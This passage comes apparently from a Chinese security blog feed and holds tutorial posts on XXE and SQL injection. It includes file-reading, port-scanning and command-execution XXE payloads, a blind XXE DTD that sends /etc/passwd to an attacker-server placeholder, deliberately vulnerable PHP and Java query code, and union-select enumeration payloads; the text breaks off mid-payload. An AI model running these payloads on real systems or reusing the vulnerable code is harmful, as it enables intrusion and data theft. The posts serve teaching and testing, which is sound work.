    <content type="html"><![CDATA[<h1 id="xml实体注入"><a href="#xml实体注入" class="headerlink" title="xml实体注入"></a>xml实体注入</h1><p>XXE，即XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><p>XXE危害：</p><ol><li>读取任意文件</li><li>执行系统命令，但需要<code>expect</code>插件</li><li>扫描网站的端口以及是否存在某些文件或目录</li><li>通过HTTP协议发起SSRF攻击</li></ol><h2 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h2><p>XML是可扩展标记语言，其文档结构包括：</p><ul><li>XML文档声明</li><li>XML文档类型定义（DTD），XXE漏洞所在位置</li><li>XML文档元素</li></ul><p>一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br> &lt;!DOCTYPE root[<br> &lt;!ELEMENT A   &quot;i&quot;&gt;<br> &lt;!ELEMENT B   &quot;am&quot;&gt;<br> &lt;!ELEMENT C   &quot;hacker&quot;&gt;<br> ]&gt;<br> &lt;root&gt;<br>     &lt;A&gt;&amp;A;&lt;/A&gt;<br>     &lt;B&gt;&amp;B;&lt;/B&gt;<br>     &lt;C&gt;&amp;C;&lt;/C&gt;<br> &lt;/root&gt;<br> <br></code></pre></td></tr></table></figure><p>还有一个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- 文档声明 --&gt;<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!-- 文档类型定义 --&gt;<br>&lt;!DOCTYPE note[                           &lt;!--定义此文档为note类型--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有四个元素--&gt;<br>&lt;!ELEMENT to   (#PCDATA)&gt;<br>&lt;!ELEMENT from   (#PCDATA)&gt;<br>&lt;!ELEMENT heading   (#PCDATA)&gt;<br>&lt;!ELEMENT body   (#PCDATA)&gt;           &lt;!--定义元素的类型为#PCDATA--&gt;<br>]&gt;<br>&lt;!-- 文档元素 --&gt;<br>&lt;note&gt;<br>&lt;to&gt;Alice&lt;/to&gt;<br>&lt;from&gt;Bob&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;I miss you !&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><h2 id="DTD结构"><a href="#DTD结构" class="headerlink" title="DTD结构"></a>DTD结构</h2><p>DTD包括以下几种定义：</p><ul><li>元素类型声明<code>&lt;!ELEMENT&gt;</code></li><li>属性表声明<code>&lt;!ATTLIST&gt;</code></li><li>实体声明<code>&lt;!ENTITY&gt;</code></li><li>记号声明<code>&lt;!NOTATION&gt;</code></li></ul><p>DTD声明有两种方式：</p><ul><li>内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>外部声明：<br><code>&lt;!DOCTYPE 根元素 SYSteM &quot;文件名&quot;&gt;</code><br><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></li></ul><p>实体声明有两种方式：</p><ul><li>内部声明：<code>&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</code></li><li>外部声明：<br><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL/协议&quot;&gt;</code><br><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></li></ul><p>XML在外部引用时支持的协议：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20190402221806316.png" alt="在这里插入图片描述"></p><h2 id="判断是否存在XXE"><a href="#判断是否存在XXE" class="headerlink" title="判断是否存在XXE"></a>判断是否存在XXE</h2><p>在<strong>输入框</strong>或URL参数中输入一些XML标签，如<code>&lt;username&gt;Hello&lt;/username&gt;</code>，如果页面回显<code>Hello</code>，则说明这个标签被后台调用，说明存在XXE。</p><p>但是有的时候，这些注入点可能不是那么明显，<strong>如一些仅适用 JSON 去访问服务的客户端</strong>。我们可以通过修改 HTTP 请求，修改 Content-Type 头部字段等方法，然后去查看<strong>响应包</strong>，查看程序是否解析了发送的内容，如果解析了，则存在 XXE 攻击漏洞。</p><p>现实中存在的大多数 XXE 漏洞都是 <code>Blind XXE</code>，即不可见的，必须采用带外通道才能查看返回信息的记录。</p><h2 id="XXE实例"><a href="#XXE实例" class="headerlink" title="XXE实例"></a>XXE实例</h2><h3 id="读取txt格式文件（file协议）"><a href="#读取txt格式文件（file协议）" class="headerlink" title="读取txt格式文件（file协议）"></a>读取txt格式文件（file协议）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a [<br>&lt;!ENTITY test SYSTEM &quot;file:///var/www/html/test.txt&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test;&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>这里调用了一个外部实体，将本机 test.txt 文件的内容赋值给实体 test。此处造成了 XML 实体注入攻击。</p><h3 id="读取PHP格式文件（PHP协议）"><a href="#读取PHP格式文件（PHP协议）" class="headerlink" title="读取PHP格式文件（PHP协议）"></a>读取PHP格式文件（PHP协议）</h3><p>因为 PHP 中有 <code>&lt;?php ?&gt;</code>，当 XML 解析时，遇到 <code>&lt;?</code> 这类的符号时，会将 PHP 当做 XML 去解析，所以会报错，故需要将其进行 <strong>base64 编码</strong>读出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>通过 PHP 协议的 filter 输出流读取 PHP，并经过 base64 编码，这样 XML 就不会去解析 PHP 中的 <code>&lt;?</code> ，就不会报错，故可以成功读出 PHP 文件的源码内容。</p><h3 id="探测端口是否开启或文件是否存在（HTTP协议）"><a href="#探测端口是否开启或文件是否存在（HTTP协议）" class="headerlink" title="探测端口是否开启或文件是否存在（HTTP协议）"></a>探测端口是否开启或文件是否存在（HTTP协议）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:3306&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><p>根据页面返回的报错信息或内容来判断端口是否开启，可以通过 <code>BurpSuite</code> 抓包来查看。</p><p><strong>通过此方法也可以来查看目录或者文件是否存在。</strong></p><h3 id="执行命令（expect协议）"><a href="#执行命令（expect协议）" class="headerlink" title="执行命令（expect协议）"></a>执行命令（expect协议）</h3><p>若想执行协议，则需要目标主机上安装了 <code>expect</code> 插件，并且做了相关配置。条件较苛刻，所以比较少见。</p><p>同时还有一点需要注意：<strong>所执行的命令不允许含有空格</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE a[<br>&lt;!ENTITY test SYSTEM &quot;expect://ls&quot;&gt;<br>]&gt;<br>&lt;c&gt;&amp;test&lt;/c&gt;<br></code></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>若服务器没有回显，那么只能使用 Blind XXE 来构建一条<strong>带外数据</strong> (OOB) 通道来读取数据。</p><blockquote><p>带有 <code>%</code> 的实体是一个参数实体，只有参数实体才能在 DTD 使用，且只能在外部 DTD 中使用。</p></blockquote><p>思路是这样的：</p><ol><li><p>攻击者发送 XML 给 Web 服务器，该 XML 文件中引用了一个外部实体；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root[<br>&lt;!ENTITY % remote SYSTEM http://攻击者的服务器IP/test.xml&gt;<br>%remote;<br>]&gt;<br></code></pre></td></tr></table></figure></li><li><p>Web 服务器解析 攻击者 发送的 XML，根据 XML 向 攻击者的服务器 请求<strong>获取恶意 DTD</strong>；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#x27;http://攻击者服务器 IP/%payload;&#x27;&gt;&quot;&gt;<br>%int；<br>%trick；<br></code></pre></td></tr></table></figure></li><li><p>Web 服务器获取到 恶意 DTD 后，根据其内容，带着含有 Web 服务器上的信息去访问 攻击者服务器上的 HTTP 或 FTP；</p></li><li><p>攻击者可以通过 <strong>请求日志 来查看请求的参数</strong>来获取信息。</p></li></ol><p>当 Web 服务器请求到恶意文件，并到 Web 服务器上进行解析时，会<strong>先通过 file 协议读取到 Web 服务器 (本机) 的 &#x2F;etc&#x2F;passwd 文件的内容，并赋给参数实体 %payload</strong>。</p><p>然后再<strong>使用 http 协议，携带者刚刚请求得到的 %payload 的内容作为参数，去访问 攻击者的服务器</strong>。</p><p>这样在攻击者的服务器的<strong>日志中就会留下相应的请求信息</strong>，攻击者就可以通过浏览日志来获取相应的敏感信息。</p><h2 id="XXE防御方法"><a href="#XXE防御方法" class="headerlink" title="XXE防御方法"></a>XXE防御方法</h2><h3 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h3><p>不同的语言有不同的禁用方式：</p><ol><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure></li><li><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure></li><li><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree:<br>xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities = FALSE))<br></code></pre></td></tr></table></figure></li></ol><h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>可以过滤一些关键字，如：**&lt;!DOCTYPE&gt;、&lt;!ENTITY&gt;、SYSTEM、PUBLIC** 等。</p><h3 id="不允许-XML-含有自己定义的-DTD"><a href="#不允许-XML-含有自己定义的-DTD" class="headerlink" title="不允许 XML 含有自己定义的 DTD"></a>不允许 XML 含有自己定义的 DTD</h3>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>xml实体注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] SQL注入</title>
    <link href="/2022/10/10/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/10/10/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p><p>简而言之，SQL 注入就是在用户输入的字符串中加入 SQL 语句，如果在设计不良的程序中忽略了检查，那么这些注入进去的 SQL 语句就会被数据库服务器误认为是正常的 SQL 语句而运行，攻击者就可以执行计划外的命令或访问未被授权的数据。</p><h2 id="SQL注入原理及实现"><a href="#SQL注入原理及实现" class="headerlink" title="SQL注入原理及实现"></a>SQL注入原理及实现</h2><p>sql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。</p><h3 id="SQL注入的PHP实现"><a href="#SQL注入的PHP实现" class="headerlink" title="SQL注入的PHP实现"></a>SQL注入的PHP实现</h3><p>定义一个数据表，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `product`(<br>    `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> auto_increment, <br>    `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>), <br>    `price` <span class="hljs-type">float</span>, <br>    <span class="hljs-keyword">PRIMARY</span> KEY (`id`)<br>)<br><br></code></pre></td></tr></table></figure><p>插入一些数据，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `product` <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;book&#x27;</span>, <span class="hljs-number">104.3</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `product` <span class="hljs-keyword">VALUES</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;computer&#x27;</span>, <span class="hljs-number">5048</span>);<br></code></pre></td></tr></table></figure><p>在PHP中常用的与SQL查询相关的函数有<code>mysql_connect</code>、<code>mysql_select_db</code>、<code>mysql_query</code>、<code>mysql_num_rows</code>、<code>mysql_fetch_assoc</code>等，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>)&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;product&quot;</span>))&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$tag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$tag</span>) || <span class="hljs-variable">$tag</span>&lt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$tag</span> = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM product WHERE id=<span class="hljs-subst">$tag</span>&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;price&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="SQL注入的JAVA实现"><a href="#SQL注入的JAVA实现" class="headerlink" title="SQL注入的JAVA实现"></a>SQL注入的JAVA实现</h3><p>JAVA实现SQL注入，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlInjection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/students&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123456&quot;</span>;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(driver);<br>            con = DriverManager.getConnection(url, user, password);<br>            <span class="hljs-keyword">if</span> (!con.isClosed()) &#123;<br>                System.out.println(<span class="hljs-string">&quot;数据库连接成功&quot;</span>);<br>            &#125;<br>            statement = con.createStatement();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;zhangsan&quot;</span>;<br>            <span class="hljs-comment">// String name = &quot;zhangsan&#x27; or &#x27;a&#x27; = &#x27;a&quot;;</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>            <span class="hljs-comment">//模拟 SQL 注入，采用拼接字符串的形式</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sqlQuery</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from student where age=&quot;</span> + age + <span class="hljs-string">&quot; and name=&#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            resultSet = statement.executeQuery(sqlQuery);<br>            <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>                System.out.println(<span class="hljs-string">&quot;id: &quot;</span> + resultSet.getInt(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot;  name： &quot;</span> + resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>)<br>                    + <span class="hljs-string">&quot;  age: &quot;</span> + resultSet.getInt(<span class="hljs-string">&quot;age&quot;</span>));<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;数据库驱动没有安装&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException sqlException) &#123;<br>            System.out.println(<span class="hljs-string">&quot;数据库连接失败&quot;</span>);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (resultSet != <span class="hljs-literal">null</span>) &#123;<br>                    resultSet.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (statement != <span class="hljs-literal">null</span>) &#123;<br>                    statement.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (con != <span class="hljs-literal">null</span>) &#123;<br>                    con.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                System.out.println(e.getMessage());<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p>在进行注入之前，首先需要确定注入点，最经典的注入点为：</p><ul><li><code>?id=1</code>，正常查询</li><li><code>?id=1&#39;</code>，出现错误</li><li><code>?id=1&#39; and 1=1-- -</code>，正常查询</li><li><code>?id=1&#39; and 1=2-- -</code>，不正常查询，但是没有出错</li></ul><p>当然每个查询语句的构造都是不同的，比如查询的闭合方式，可能是<code>&#39;</code>，可能是<code>&quot;</code>，或者<code>&#39;)</code>等待，这些需要测试；而且查询的可能是数字型，也可能是字符型；后面的条件也需要灵活变换，<code>and</code>，<code>or</code>等能构成条件的都可以尝试。</p><p>下面给出一些遇到的例子，不定时更新：</p><ul><li><code>?id=425-1</code></li></ul><h2 id="SQL注入种类"><a href="#SQL注入种类" class="headerlink" title="SQL注入种类"></a>SQL注入种类</h2><p>在进行注入之前，了解关键的数据库：<code>information_schema</code>，<code>information_schema</code> 用于存储数据库元数据，例如数据库名（<code>information_schema.schemata</code>）、表名（<code>information_schema.tables</code>）、列名（<code>information_schema.columns</code>）、访问权限等。</p><blockquote><p>在Mysql5.0以上和Mysql5.0以下的版本中最大的区别就是information_schema这个系统表。</p><p>在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，可以通过SQL注入来拿到用户的账号和口令，而Mysql5.0以下的只能暴力跑表名；5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p></blockquote><h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><p><code>union</code>注入也叫联合注入。在SQL中，<code>union</code>用于把来自许多<code>select</code>语句的结果组合到一个结果集合中，所以利用这个特性，可以将不同的表中的数据显示到同一个位置。</p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a><strong>条件</strong></h4><p><code>union</code>注入的条件：</p><ul><li>有回显；</li><li>注入点带入的SQL语句是查询<code>select</code>语句；</li><li><code>union</code>联合的多个查询结果，其列数相同，且各列的数据类型也相同；</li></ul><blockquote><p>注意：MySQL版本⼩于4.0时，不⽀持union select联合查询</p></blockquote><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><code>union</code>注入的典型实例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3-- -</span><br><span class="hljs-string"># 判断回显列数，这里加入是3列</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><span class="hljs-comment">-- -</span><br># <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 也可以判断列数，但是用<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>更方便；后面用<span class="hljs-keyword">null</span>更合适，因为回显的数据类型不确定<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select database(),user(),version()-- -</span><br><span class="hljs-string"># 可以调用一些函数来收集数据库信息</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">-- -</span><br># 查询库名<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select null,null,group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="hljs-string"># 查询表名，用group_concat()将输出拼接到一块</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span 